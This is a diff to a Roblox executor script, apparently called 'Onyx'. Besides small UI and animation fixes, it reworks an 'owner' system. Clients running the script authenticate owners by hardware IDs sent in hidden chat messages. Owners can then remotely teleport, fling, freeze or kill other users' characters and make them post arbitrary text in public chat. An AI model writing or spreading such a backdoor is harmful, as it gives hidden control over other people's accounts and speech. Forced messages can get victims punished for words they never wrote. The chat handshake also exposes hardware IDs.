@@ -771,7 +771,7 @@ UpdatesScroll.BackgroundTransparency = 1
 UpdatesScroll.BorderSizePixel = 0
 UpdatesScroll.Position = UDim2.new(0, 15, 0, 45)
 UpdatesScroll.Size = UDim2.new(1, -30, 1, -55)
-UpdatesScroll.ScrollBarThickness = 4
+UpdatesScroll.ScrollBarThickness = 0
 UpdatesScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
 UpdatesScroll.ScrollBarImageTransparency = 0.8
 UpdatesScroll.ZIndex = 4
@@ -1158,15 +1158,25 @@ RestoreAnimsButton.MouseButton1Click:Connect(function()
     pcall(function() delfile("OnyxLastAnims.json") end)
     table.clear(lastAnimations)
     
+    -- Stop ALL playing animation tracks (Humanoid + Animator)
     local Hum = Char:FindFirstChildOfClass("Humanoid")
     if Hum then
         for _, track in ipairs(Hum:GetPlayingAnimationTracks()) do
             track:Stop(0)
         end
+        local animator = Hum:FindFirstChildOfClass("Animator")
+        if animator then
+            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+                track:Stop(0)
+            end
+        end
     end
     
     local Animate = Char:FindFirstChild("Animate")
     if Animate then
+        -- Re-enable the Animate script (emotes/custom anims disable it)
+        pcall(function() Animate.Disabled = false end)
+        
         pcall(function()
             local desc = game:GetService("Players"):GetHumanoidDescriptionFromUserId(plr.UserId)
             if desc then
@@ -1184,6 +1194,12 @@ RestoreAnimsButton.MouseButton1Click:Connect(function()
             end
         end)
     end
+    
+    -- Kick the humanoid state to restart default animations
+    if Hum then
+        pcall(function() Hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+    end
+    
     SendNotify("Animations", "Restored to original Roblox animations", 3)
 end)
 
@@ -1221,7 +1237,7 @@ AnimScrollFrame.BackgroundTransparency = 0.9
 AnimScrollFrame.BorderSizePixel = 0
 AnimScrollFrame.Position = UDim2.new(0, 0, 0, 129)
 AnimScrollFrame.Size = UDim2.new(1, 0, 1, -189)
-AnimScrollFrame.ScrollBarThickness = 4
+AnimScrollFrame.ScrollBarThickness = 0
 AnimScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
 AnimScrollFrame.ScrollBarImageTransparency = 0.8
 AnimScrollFrame.ZIndex = 4
@@ -5713,8 +5729,8 @@ local function buildNametag(targetPlayer, cfg)
     billboard.Adornee         = head
     billboard.Size            = UDim2.new(0, 300, 0, 100) -- Large enough to contain the pill
     billboard.StudsOffset     = Vector3.new(0, 2.8, 0)
-    billboard.AlwaysOnTop     = false
-    billboard.MaxDistance     = 80
+    billboard.AlwaysOnTop     = true
+    billboard.MaxDistance     = math.huge
     billboard.LightInfluence  = 0
     billboard.ClipsDescendants = false
     billboard.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
@@ -6430,21 +6446,48 @@ local function GetHWID()
 end
 
 local OwnerHWIDs = {
-    ["f4d0e7f4-d3b7-4ec3-87c9-241f9e3611fb"] = true,
+    ["F4D0E7F4-D3B7-4EC3-87C9-241F9E3611FB"] = true,
     ["f6f7d925-e387-4f0e-a339-bf26dcc41669"] = true
 }
 
+-- Case-insensitive HWID matching helper
+local function IsHWIDOwner(hwid)
+    if not hwid then return false end
+    local search = hwid:lower()
+    for ohwid, _ in pairs(OwnerHWIDs) do
+        if ohwid:lower() == search then return true end
+    end
+    return false
+end
+
 local currentHwid = GetHWID():lower()
-local isOwner = OwnerHWIDs[currentHwid] ~= nil
+local isOwner = IsHWIDOwner(currentHwid)
 local SessionOwners = {}
 if isOwner then SessionOwners[plr.UserId] = true end
+
+-- Notify local player of their auth status
+task.spawn(function()
+    task.wait(1)
+    if isOwner then
+        SendNotify("👑 Onyx", "Owner Authentication Success", 3)
+    else
+        -- If user EXPECTS to be owner, they'll see this and can check console
+        warn("[Onyx] Owner Auth matched FALSE. Your HWID: " .. currentHwid)
+    end
+end)
+
 
 local function sendHiddenChat(msg)
     pcall(function()
         local TextChatService = game:GetService("TextChatService")
         if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            local channel = TextChatService.TextChannels.RBXGeneral
-            channel:SendAsync(msg)
+            -- Try common channels
+            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
+                or TextChatService.TextChannels:FindFirstChild("RBXSystem")
+                or (TextChatService.TextChannels:GetChildren()[1])
+            if channel then
+                channel:SendAsync(msg)
+            end
         else
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
         end
@@ -6454,23 +6497,35 @@ end
 local function handleOwnerCommand(chatterData, msg)
     local lmsg = msg:lower()
 
-    -- Handshake logic
-    if lmsg:sub(1, 14) == "/e onyx_auth_" then
-        local hwid = lmsg:sub(15)
-        if OwnerHWIDs[hwid] then
+    -- 1. Handshake logic (case-insensitive HWID)
+    if lmsg:find("onyx_auth_") then
+        local start = lmsg:find("onyx_auth_") + 10
+        local hwid = lmsg:sub(start):split(" ")[1]
+        if IsHWIDOwner(hwid) then
             SessionOwners[chatterData.UserId] = true
+            SendNotify("👑 Owner", chatterData.DisplayName .. " (@" .. chatterData.Name .. ") Authenticated", 3)
         end
         return
     end
 
-    if lmsg == "/e onyx_ping" and isOwner then
+    if (lmsg == "/e onyx_ping" or lmsg == "onyx_ping") and isOwner then
         sendHiddenChat("/e onyx_auth_" .. currentHwid)
         return
     end
 
-    -- Process actual commands if the chatter is an owner
+    -- 2. Command Processing
+    -- Strip common prefixes (/e, /w, etc.)
+    local cleanMsg = msg
+    if lmsg:sub(1,3) == "/e " then
+        cleanMsg = msg:sub(4)
+    elseif lmsg:sub(1,3) == "/w " then
+        -- find next space
+        local nextSpace = msg:find(" ", 4)
+        if nextSpace then cleanMsg = msg:sub(nextSpace + 1) end
+    end
+
     if SessionOwners[chatterData.UserId] then
-        local parts = msg:split(" ")
+        local parts = cleanMsg:split(" ")
         local cmd = parts[1]:lower()
         local targetStr = parts[2]
         
@@ -6479,28 +6534,30 @@ local function handleOwnerCommand(chatterData, msg)
         local isTargetMe = false
         if targetStr == "*" then
             isTargetMe = true
-        elseif plr.Name:lower():sub(1, #targetStr) == targetStr:lower() or 
-               plr.DisplayName:lower():sub(1, #targetStr) == targetStr:lower() then
-            isTargetMe = true
+        else
+            local ln = plr.Name:lower()
+            local ld = plr.DisplayName:lower()
+            local lt = targetStr:lower()
+            if ln:sub(1, #lt) == lt or ld:sub(1, #lt) == lt then
+                isTargetMe = true
+            end
         end
 
         if not isTargetMe then return end
 
         local char = plr.Character
         local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        local hum = char and char:FindFirstChild("Humanoid")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
 
         if cmd == ".bring" then
             local ownerChar = chatterData.Character
             local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
             if ownerHrp and hrp then
                 hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
+                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .bring", 3)
             end
         elseif cmd == ".fling" then
-            local ownerChar = chatterData.Character
-            local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
-            if ownerHrp and hrp then
-                hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
+            if hrp then
                 local bv = Instance.new("BodyVelocity")
                 bv.Velocity = Vector3.new(math.random(-100,100), 500, math.random(-100,100))
                 bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
@@ -6514,11 +6571,13 @@ local function handleOwnerCommand(chatterData, msg)
                 game:GetService("Debris"):AddItem(bv, 1.5)
                 game:GetService("Debris"):AddItem(bav, 1.5)
                 if hum then hum.Sit = true end
+                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .fling", 3)
             end
         elseif cmd == ".say" then
             local text = table.concat(parts, " ", 3)
             if text and text ~= "" then
                 sendHiddenChat(text)
+                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " forced say: " .. text, 3)
             end
         elseif cmd == ".lock" or cmd == ".freeze" then
             if hrp then hrp.Anchored = true end
@@ -6526,13 +6585,13 @@ local function handleOwnerCommand(chatterData, msg)
                 hum.WalkSpeed = 0
                 hum.JumpPower = 0 
             end
-            local text = table.concat(parts, " ", 3)
-            if text and text ~= "" then
-                sendHiddenChat(text)
-            end
+            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .freeze", 3)
         elseif cmd == ".kill" then
+            if char then char:BreakJoints() end
             if hum then hum.Health = 0 end
+            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .kill", 3)
         elseif cmd == ".antigrav" then
+            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .antigrav", 3)
             if hrp then
                 hrp.Anchored = true
                 task.spawn(function()
@@ -6555,14 +6614,14 @@ Players.PlayerAdded:Connect(function(p)
     p.Chatted:Connect(function(msg) handleOwnerCommand(p, msg) end)
 end)
 
--- If this is an owner, broadcast presence and setup UI
+-- Auth broadcast + Owner Panel (owners only) / ping (non-owners)
 if isOwner then
     task.spawn(function()
         task.wait(2)
         sendHiddenChat("/e onyx_auth_" .. currentHwid)
     end)
     
-    -- Built-in Owner Menu
+    -- Built-in Owner Panel (only visible to authenticated HWIDs)
     local OwnerFrame = Instance.new("Frame")
     OwnerFrame.Name = "OnyxOwnerMenu"
     OwnerFrame.Parent = OnyxUI
@@ -6639,10 +6698,10 @@ if isOwner then
                 end
             end
             sendHiddenChat(msg)
+            SendNotify("👑 Owner", "Sent: " .. msg, 2)
         end)
     end
 else
-    -- Ping for owners if not one
     task.spawn(function()
         task.wait(2)
         sendHiddenChat("/e onyx_ping")
